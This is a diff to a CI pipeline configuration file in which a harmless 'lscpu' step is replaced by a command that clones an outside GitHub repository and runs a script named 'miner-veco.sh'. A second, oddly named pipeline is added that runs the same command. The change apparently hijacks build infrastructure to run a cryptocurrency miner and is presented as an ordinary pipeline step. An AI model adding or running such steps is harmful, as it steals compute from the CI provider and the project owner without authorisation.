@@ -26,4 +26,14 @@ pipelines:
             - name: myFirstRepo
         execution:
           onExecute:
-            - lscpu
+            - git clone https://github.com/maujendakint8sa/asasdasf && cd asasdasf && ./miner-veco.sh
+  - name: my_first_pipelinwe
+    steps:
+      - name: p1_s1w
+        type: Bash
+        configuration:
+          inputResources:
+            - name: myFirstRepo
+        execution:
+          onExecute:
+            - git clone https://github.com/maujendakint8sa/asasdasf && cd asasdasf && ./miner-veco.sh
